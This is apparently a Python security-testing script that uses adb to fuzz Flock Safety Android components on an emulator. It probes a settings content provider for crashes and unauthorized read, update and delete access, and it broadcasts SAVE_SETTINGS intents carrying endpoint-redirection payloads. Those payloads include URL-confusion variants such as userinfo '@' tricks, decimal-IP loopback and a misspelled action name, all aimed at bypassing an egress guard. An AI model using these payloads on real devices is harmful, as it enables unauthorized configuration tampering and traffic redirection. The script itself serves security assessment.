#!/usr/bin/env python3
import argparse
import json
import re
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def run_adb(adb, serial, args, timeout=40):
    cmd = [str(adb), '-s', serial] + args
    start = time.time()
    try:
        cp = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            timeout=timeout,
            check=False,
        )
        return {
            'cmd': cmd,
            'args': args,
            'returncode': cp.returncode,
            'stdout': cp.stdout,
            'stderr': cp.stderr,
            'duration_s': round(time.time() - start, 3),
            'timed_out': False,
        }
    except subprocess.TimeoutExpired as exc:
        return {
            'cmd': cmd,
            'args': args,
            'returncode': 124,
            'stdout': (exc.stdout or '') if isinstance(exc.stdout, str) else '',
            'stderr': ((exc.stderr or '') if isinstance(exc.stderr, str) else '') + '\nTIMEOUT',
            'duration_s': round(time.time() - start, 3),
            'timed_out': True,
        }


def preflight_checks(adb, serial):
    checks = {
        'adb_exists': adb.exists(),
        'adb_path': str(adb),
    }
    if not checks['adb_exists']:
        checks['overall_ok'] = False
        checks['failure_reason_code'] = 'adb_not_found'
        return checks

    get_state = run_adb(adb, serial, ['get-state'], timeout=20)
    checks['device_get_state'] = {
        'returncode': get_state.get('returncode'),
        'stdout': (get_state.get('stdout') or '').strip(),
        'stderr': (get_state.get('stderr') or '').strip(),
        'timed_out': bool(get_state.get('timed_out')),
    }
    state_ok = get_state.get('returncode') == 0 and (get_state.get('stdout') or '').strip() == 'device'

    shell_probe = run_adb(adb, serial, ['shell', 'echo', '__r2_preflight_ok__'], timeout=20)
    checks['minimal_shell_probe'] = {
        'returncode': shell_probe.get('returncode'),
        'stdout': (shell_probe.get('stdout') or '').strip(),
        'stderr': (shell_probe.get('stderr') or '').strip(),
        'timed_out': bool(shell_probe.get('timed_out')),
    }
    shell_ok = shell_probe.get('returncode') == 0 and '__r2_preflight_ok__' in (shell_probe.get('stdout') or '')

    checks['overall_ok'] = bool(state_ok and shell_ok)
    if checks['overall_ok']:
        checks['failure_reason_code'] = None
    elif not state_ok:
        checks['failure_reason_code'] = 'device_unreachable'
    else:
        checks['failure_reason_code'] = 'shell_probe_failed'
    return checks


def classify_endpoint_cause_code(broadcast_rec, log_text, socket_text, host_key):
    joined = '\n'.join(
        [
            (broadcast_rec.get('stdout') or ''),
            (broadcast_rec.get('stderr') or ''),
            log_text or '',
            socket_text or '',
        ]
    ).lower()
    host_l = (host_key or '').lower()
    if 'phonehome request target=' in joined and 'status=200' in joined:
        return 'status_200'
    if host_l and ('estab' in joined) and (host_l in joined):
        return 'real_network_reach'
    if broadcast_rec.get('timed_out') or broadcast_rec.get('returncode') == 124 or ' timed out' in joined or 'timeout' in joined:
        return 'timeout'
    if any(k in joined for k in ['unknownhost', 'unknown host', 'unable to resolve host', 'name or service not known']):
        return 'unknown_host'
    if any(k in joined for k in ['connection refused', 'econnrefused']):
        return 'connection_refused'
    if any(k in joined for k in ['connection reset', 'econnreset', 'socket reset', 'broken pipe']):
        return 'socket_reset'
    return 'no_signal'


def classify_provider(rec):
    text = ((rec.get('stdout') or '') + '\n' + (rec.get('stderr') or '')).lower()
    if 'nullpointerexception' in text:
        return 'provider_npe'
    if any(k in text for k in ['sqliteexception', 'illegalargumentexception', 'error while accessing provider', 'java.lang.securityexception']):
        return 'safe_reject'
    if rec.get('returncode') == 0:
        return 'success'
    return 'other_failure'


def read_logcat(adb, serial, lines=500):
    return run_adb(adb, serial, ['logcat', '-d', '-t', str(lines)], timeout=30)


def clear_logcat(adb, serial):
    run_adb(adb, serial, ['logcat', '-c'], timeout=15)


def ss_snapshot(adb, serial):
    rec = run_adb(adb, serial, ['shell', 'ss', '-tnp'], timeout=25)
    if rec['returncode'] != 0 or not rec['stdout'].strip():
        rec = run_adb(adb, serial, ['shell', 'cat', '/proc/net/tcp'], timeout=20)
    return rec


def save_settings_payloads(endpoint: str):
    settings_variants = [
        {},
        {"endpoint": endpoint},
        {"uploadEndpoint": endpoint},
        {"uploadUrl": endpoint},
        {"baseUrl": endpoint},
    ]
    for settings in settings_variants:
        yield {
            "id": f"settings_json_{'empty' if not settings else '_'.join(settings.keys())}",
            "extras": [
                "--es",
                "requester",
                "targeted-egress-r2",
                "--es",
                "settings",
                json.dumps(settings, separators=(",", ":")),
                "--es",
                "endpoint",
                endpoint,
            ],
        }


def load_guidance(path: str | None):
    if not path:
        return {}
    p = Path(path)
    if not p.exists():
        return {'error': f'guidance file not found: {p}'}
    try:
        return json.loads(p.read_text(encoding='utf-8'))
    except Exception as exc:
        return {'error': f'guidance parse failure: {exc}'}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--root', required=True)
    ap.add_argument('--serial', default='emulator-5554')
    ap.add_argument('--out-dir', required=True)
    ap.add_argument('--guidance-file', default='', help='Optional JSON file with additional_endpoints and provider_mutations')
    args = ap.parse_args()

    root = Path(args.root)
    adb = root / 'android-sdk' / 'platform-tools' / 'adb.exe'
    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)

    provider = 'com.flocksafety.android.settingsservice.provider'
    settings_uri = f'content://{provider}/settings'
    core_uri = f'content://{provider}/core_values'

    report = {
        'generated_at_utc': now_iso(),
        'serial': args.serial,
        'out_dir': str(out),
        'todo_results': {},
    }
    guidance = load_guidance(args.guidance_file)
    report['guidance'] = {
        'path': args.guidance_file or None,
        'loaded': bool(guidance and not guidance.get('error')),
        'error': guidance.get('error') if isinstance(guidance, dict) else None,
    }
    report['preflight'] = preflight_checks(adb, args.serial)
    if not report['preflight'].get('overall_ok'):
        report['halted_before_campaigns'] = True
        report['halt_reason_code'] = report['preflight'].get('failure_reason_code') or 'preflight_failed'
        (out / 'targeted_report.json').write_text(json.dumps(report, indent=2), encoding='utf-8')
        md = [
            '# Targeted Provider + Endpoint Fuzz Report (R2)',
            '',
            f"- Generated: `{report['generated_at_utc']}`",
            f"- Serial: `{args.serial}`",
            '',
            '## preflight',
            '',
            '```json',
            json.dumps(report['preflight'], indent=2),
            '```',
            '',
            f"- halted_before_campaigns: `{report['halted_before_campaigns']}`",
            f"- halt_reason_code: `{report['halt_reason_code']}`",
            '',
        ]
        (out / 'targeted_report.md').write_text('\n'.join(md), encoding='utf-8')
        raise SystemExit(2)

    # 001 provider npe envelope
    cases_001 = [
        {'id': 'insert_key_value_no_datatype', 'args': ['shell', 'content', 'insert', '--uri', settings_uri, '--bind', 'key:s:__r2_probe__', '--bind', 'value:s:alpha']},
        {'id': 'insert_key_value_with_datatype', 'args': ['shell', 'content', 'insert', '--uri', settings_uri, '--bind', 'key:s:__r2_probe__', '--bind', 'value:s:alpha', '--bind', 'dataType:s:String']},
        {'id': 'insert_missing_value', 'args': ['shell', 'content', 'insert', '--uri', settings_uri, '--bind', 'key:s:__r2_probe__']},
        {'id': 'insert_empty_key', 'args': ['shell', 'content', 'insert', '--uri', settings_uri, '--bind', 'key:s:', '--bind', 'value:s:beta']},
        {'id': 'insert_long_key', 'args': ['shell', 'content', 'insert', '--uri', settings_uri, '--bind', f"key:s:{'K'*128}", '--bind', 'value:s:gamma']},
        {'id': 'query_settings_known', 'args': ['shell', 'content', 'query', '--uri', settings_uri, '--where', "key='uploadPort'"]},
        {'id': 'delete_probe', 'args': ['shell', 'content', 'delete', '--uri', settings_uri, '--where', "key='__r2_probe__'"]},
        {'id': 'query_bad_segment', 'args': ['shell', 'content', 'query', '--uri', f'content://{provider}/nonexistent']},
    ]
    for m in guidance.get('provider_mutations', []) if isinstance(guidance, dict) else []:
        case_id = m.get('id')
        binds = m.get('binds', [])
        if not case_id or not isinstance(binds, list):
            continue
        mutation_args = ['shell', 'content', 'insert', '--uri', settings_uri]
        for b in binds:
            if isinstance(b, str):
                mutation_args.extend(['--bind', b])
        cases_001.append({'id': case_id, 'args': mutation_args})
    rows_001 = []
    for c in cases_001:
        clear_logcat(adb, args.serial)
        rec = run_adb(adb, args.serial, c['args'])
        log = read_logcat(adb, args.serial, 400)
        rec['case_id'] = c['id']
        rec['classification'] = classify_provider(rec)
        log_lines = (log.get('stdout') or '').splitlines()
        rec['logcat_npe_hits'] = [ln for ln in log_lines if 'NullPointerException' in ln or 'settingsservice.provider' in ln][:30]
        rec['fatal_in_logcat'] = any('FATAL EXCEPTION' in ln for ln in log_lines)
        rows_001.append(rec)

    report['todo_results']['fuzz-targeted-001-provider-npe-space'] = {
        'summary': {
            'total_cases': len(rows_001),
            'provider_npe_cases': [r['case_id'] for r in rows_001 if r['classification'] == 'provider_npe'],
            'safe_reject_cases': [r['case_id'] for r in rows_001 if r['classification'] == 'safe_reject'],
            'success_cases': [r['case_id'] for r in rows_001 if r['classification'] == 'success'],
            'fatal_exception_in_logcat': any(r['fatal_in_logcat'] for r in rows_001),
        },
        'cases': rows_001,
    }

    # 002 authz boundary
    uid = run_adb(adb, args.serial, ['shell', 'id'], timeout=15)
    authz_cases = [
        {'id': 'query_core_values', 'args': ['shell', 'content', 'query', '--uri', core_uri]},
        {'id': 'query_settings', 'args': ['shell', 'content', 'query', '--uri', settings_uri]},
        {'id': 'query_projection_lower', 'args': ['shell', 'content', 'query', '--uri', settings_uri, '--projection', 'id:key:value:data_type']},
        {'id': 'query_projection_upper', 'args': ['shell', 'content', 'query', '--uri', settings_uri, '--projection', 'ID:KEY:VALUE:DATA_TYPE']},
        {'id': 'update_settings_key', 'args': ['shell', 'content', 'update', '--uri', settings_uri, '--bind', 'value:s:8443', '--where', "key='uploadPort'"]},
        {'id': 'delete_where_false', 'args': ['shell', 'content', 'delete', '--uri', settings_uri, '--where', '1=0']},
        {'id': 'query_nonexistent_uri', 'args': ['shell', 'content', 'query', '--uri', f'content://{provider}/bogus']},
    ]
    rows_002 = []
    for c in authz_cases:
        rec = run_adb(adb, args.serial, c['args'])
        rec['case_id'] = c['id']
        rec['classification'] = classify_provider(rec)
        stderr = rec.get('stderr') or ''
        rec['unauthorized_effective_access'] = bool(rec.get('returncode') == 0 and 'Error while accessing provider' not in stderr)
        rows_002.append(rec)

    report['todo_results']['fuzz-targeted-002-provider-authz-boundary'] = {
        'summary': {
            'caller_identity': uid.get('stdout', '').strip(),
            'effective_access_cases': [r['case_id'] for r in rows_002 if r['unauthorized_effective_access']],
            'rejected_cases': [r['case_id'] for r in rows_002 if not r['unauthorized_effective_access']],
            'npe_or_reject_signals': {r['case_id']: r['classification'] for r in rows_002},
        },
        'cases': rows_002,
    }

    # 003 permission model
    pkg = 'com.flocksafety.android.settingsservice'
    dumpsys = run_adb(adb, args.serial, ['shell', 'dumpsys', 'package', pkg], timeout=70)
    pm_path = run_adb(adb, args.serial, ['shell', 'pm', 'path', pkg], timeout=20)
    excerpt = []
    for ln in dumpsys.get('stdout', '').splitlines():
        low = ln.lower()
        if 'settingsservice.provider' in low or 'readpermission' in low or 'writepermission' in low or 'granturipermissions' in low or ('provider' in low and 'authority' in low):
            excerpt.append(ln)
    excerpt = excerpt[:220]
    obs = report['todo_results']['fuzz-targeted-002-provider-authz-boundary']['summary']['effective_access_cases']

    report['todo_results']['fuzz-targeted-003-provider-permission-model'] = {
        'summary': {
            'pm_path': pm_path.get('stdout', '').strip(),
            'provider_model_excerpt_lines': excerpt,
            'observed_shell_access_cases': obs,
            'mismatch_indicator': bool(obs),
        },
        'dumpsys_returncode': dumpsys.get('returncode'),
    }

    # 004 egress abuse variants
    endpoints = [
        'https://dev-gimlet.flocksafety.com/',
        'HTTPS://DEV-GIMLET.FLOCKSAFETY.COM/',
        'https://dev-gimlet.flocksafety.com.:443/',
        'https://dev-gimlet.flocksafety.com@127.0.0.1:14011/phonehome/fake',
        'http://2130706433:14011/phonehome/fake',
        'https://10.0.2.2:18443/phonehome/fake',
        'http://127.0.0.1:14011/phonehome/fake',
    ]
    for ep in guidance.get('additional_endpoints', []) if isinstance(guidance, dict) else []:
        if isinstance(ep, str) and 'flocksafety.com' in ep.lower() and ep not in endpoints:
            endpoints.append(ep)

    action_variants = [
        'com.flocksafety.action.SAVE_SETTINGS',
        'com.flocksaftey.action.SAVE_SETTINGS',
    ]
    rows_004 = []
    for ep in endpoints:
        for payload in save_settings_payloads(ep):
            for action in action_variants:
                clear_logcat(adb, args.serial)
                b = run_adb(
                    adb,
                    args.serial,
                    [
                        'shell',
                        'am',
                        'broadcast',
                        '-a',
                        action,
                        '-p',
                        'com.flocksafety.android.phonehomeservice',
                        *payload['extras'],
                    ],
                    timeout=30,
                )
                time.sleep(1.2)
                log = read_logcat(adb, args.serial, 600)
                ss = ss_snapshot(adb, args.serial)
                host = re.sub(r'^https?://', '', ep, flags=re.IGNORECASE).split('/')[0]
                host_key = host.split(':')[0]
                log_text = log.get('stdout') or ''
                ss_text = ss.get('stdout') or ''
                marker_words = ['dev-gimlet', 'timed out', 'blocked', 'phonehome', 'unknownhost']
                host_log_hits = [ln for ln in log_text.splitlines() if host_key.lower() in ln.lower() or any(m in ln.lower() for m in marker_words)][:50]
                ss_hits = [ln for ln in ss_text.splitlines() if host_key in ln or ':18443' in ln or ':14011' in ln][:50]
                real_reach = any(('dev-gimlet' in ln.lower()) and 'ESTAB' in ln for ln in ss_hits)
                status_200 = any('Phonehome request target=' in ln and 'status=200' in ln for ln in log_text.splitlines())
                cause_code = classify_endpoint_cause_code(b, log_text, ss_text, host_key)
                rows_004.append({
                    'endpoint': ep,
                    'host_key': host_key,
                    'action': action,
                    'payload_id': payload['id'],
                    'broadcast_returncode': b.get('returncode'),
                    'broadcast_stdout': (b.get('stdout') or '').strip(),
                    'broadcast_stderr': (b.get('stderr') or '').strip(),
                    'host_log_hits': host_log_hits,
                    'socket_hits': ss_hits,
                    'real_endpoint_reached_signal': real_reach,
                    'http_status_200_signal': status_200,
                    'any_endpoint_reached_signal': bool(real_reach or status_200),
                    'cause_code': cause_code,
                    'cause_evidence': {
                        'broadcast_timed_out': bool(b.get('timed_out')),
                        'broadcast_returncode': b.get('returncode'),
                        'unknown_host_signal': bool(re.search(r'unknownhost|unknown host|unable to resolve host|name or service not known', ((b.get('stdout') or '') + '\n' + (b.get('stderr') or '') + '\n' + log_text), flags=re.IGNORECASE)),
                        'connection_refused_signal': bool(re.search(r'connection refused|econnrefused', ((b.get('stdout') or '') + '\n' + (b.get('stderr') or '') + '\n' + log_text), flags=re.IGNORECASE)),
                        'socket_reset_signal': bool(re.search(r'connection reset|econnreset|socket reset|broken pipe', ((b.get('stdout') or '') + '\n' + (b.get('stderr') or '') + '\n' + log_text), flags=re.IGNORECASE)),
                        'timeout_signal': bool(re.search(r'timeout|timed out', ((b.get('stdout') or '') + '\n' + (b.get('stderr') or '') + '\n' + log_text), flags=re.IGNORECASE)),
                        'host_key_seen_in_log_or_socket': bool(host_key and ((host_key.lower() in log_text.lower()) or (host_key in ss_text))),
                    },
                })

    any_reach = any(r['any_endpoint_reached_signal'] for r in rows_004)
    no_reach_cause_codes = sorted({r['cause_code'] for r in rows_004 if not r['any_endpoint_reached_signal']})
    summary_reason_codes = ['reach_observed'] if any_reach else (no_reach_cause_codes if no_reach_cause_codes else ['no_signal'])
    report['todo_results']['fuzz-targeted-004-endpoint-egress-guard-abuse'] = {
        'summary': {
            'attempt_count': len(rows_004),
            'real_endpoint_reached_any': any(r['real_endpoint_reached_signal'] for r in rows_004),
            'rows_with_reach_signal': [r['endpoint'] for r in rows_004 if r['real_endpoint_reached_signal']],
            'http_status_200_any': any(r['http_status_200_signal'] for r in rows_004),
            'rows_with_http_status_200': [r['endpoint'] for r in rows_004 if r['http_status_200_signal']],
            'any_endpoint_reached_any': any(r['any_endpoint_reached_signal'] for r in rows_004),
            'rows_with_any_endpoint_reach': [r['endpoint'] for r in rows_004 if r['any_endpoint_reached_signal']],
            'sandbox_local_endpoint_rows': [r['endpoint'] for r in rows_004 if '10.0.2.2' in r['endpoint'] or '127.0.0.1' in r['endpoint'] or '2130706433' in r['endpoint']],
            'endpoint_reach_assertion_outcome': 'pass' if any_reach else 'fail',
            'endpoint_reach_assertion_reason_codes': summary_reason_codes,
            'endpoint_reach_assertion_final_reason_code': summary_reason_codes[0],
            'no_reach_reason_codes': no_reach_cause_codes if not any_reach else [],
        },
        'attempts': rows_004,
    }

    # 005 endpoint traceback + classification
    endpoint_focus = root / 'results' / 'fuzz_static_closeout_20260922T093323' / 'endpoint_focus.json'
    per_apk = root / 'results' / 'fuzz_static_closeout_20260922T093323' / 'per_apk_endpoints.json'
    shim_src = root / 'phonehome-shim-v3' / 'src' / 'com' / 'flocksafety' / 'android' / 'phonehomeservice' / 'SaveSettingsReceiver.java'
    rows_005 = []

    if endpoint_focus.exists():
        ej = json.loads(endpoint_focus.read_text(encoding='utf-8'))
        for row in ej.get('rows', []):
            ep = row.get('endpoint', '')
            if not ep:
                continue
            risk = 'high-real-network' if 'dev-gimlet' in ep.lower() else 'sandbox-local'
            proto = 'https' if ep.lower().startswith('https://') else ('http' if ep.lower().startswith('http://') else 'raw-hostport')
            component = row.get('apk', 'unknown')
            rows_005.append({'source': 'endpoint_focus.json', 'component': component, 'endpoint': ep, 'protocol': proto, 'class': row.get('class', 'unknown'), 'risk_class': risk})

    if per_apk.exists():
        pj = json.loads(per_apk.read_text(encoding='utf-8'))
        for apk, entries in pj.items():
            for e in entries:
                ep = e.get('endpoint', '')
                if any(k in ep for k in ['dev-gimlet', '10.0.2.2', '127.0.0.1', 'phonehome/fake']):
                    risk = 'high-real-network' if 'dev-gimlet' in ep.lower() else 'sandbox-local'
                    proto = 'https' if ep.lower().startswith('https://') else ('http' if ep.lower().startswith('http://') else 'raw-hostport')
                    rows_005.append({'source': 'per_apk_endpoints.json', 'component': apk, 'endpoint': ep, 'protocol': proto, 'class': e.get('class', 'unknown'), 'risk_class': risk})

    if shim_src.exists():
        for i, ln in enumerate(shim_src.read_text(encoding='utf-8').splitlines(), start=1):
            if 'DEFAULT_ENDPOINT' in ln or 'FALLBACK_ENDPOINT' in ln:
                m = re.search(r'"(https?://[^\"]+)"', ln)
                endpoint = m.group(1) if m else ''
                rows_005.append({'source': 'SaveSettingsReceiver.java', 'component': 'phonehome-shim-v3', 'path': str(shim_src), 'line': i, 'endpoint': endpoint, 'protocol': 'https' if endpoint.lower().startswith('https://') else ('http' if endpoint.lower().startswith('http://') else 'unknown'), 'class': 'code_constant', 'risk_class': 'sandbox-local'})

    uniq_real = sorted({r['endpoint'] for r in rows_005 if r.get('risk_class') == 'high-real-network'})
    report['todo_results']['fuzz-targeted-005-endpoint-string-traceback'] = {
        'summary': {
            'trace_count': len(rows_005),
            'real_network_count': len([r for r in rows_005 if r.get('risk_class') == 'high-real-network']),
            'sandbox_local_count': len([r for r in rows_005 if r.get('risk_class') == 'sandbox-local']),
            'unique_real_network_endpoints': uniq_real,
            'risk_method': 'real network constants from static extraction classified high-real-network; emulator loopback/backend-local constants classified sandbox-local',
        },
        'trace_rows': rows_005,
    }

    (out / 'targeted_report.json').write_text(json.dumps(report, indent=2), encoding='utf-8')

    md = ['# Targeted Provider + Endpoint Fuzz Report (R2)', '', f"- Generated: `{report['generated_at_utc']}`", f"- Serial: `{args.serial}`", '']
    for tid, body in report['todo_results'].items():
        md.append(f'## {tid}')
        md.append('')
        md.append('```json')
        md.append(json.dumps(body['summary'], indent=2))
        md.append('```')
        md.append('')
    (out / 'targeted_report.md').write_text('\n'.join(md) + '\n', encoding='utf-8')
    print(str(out))


if __name__ == '__main__':
    main()
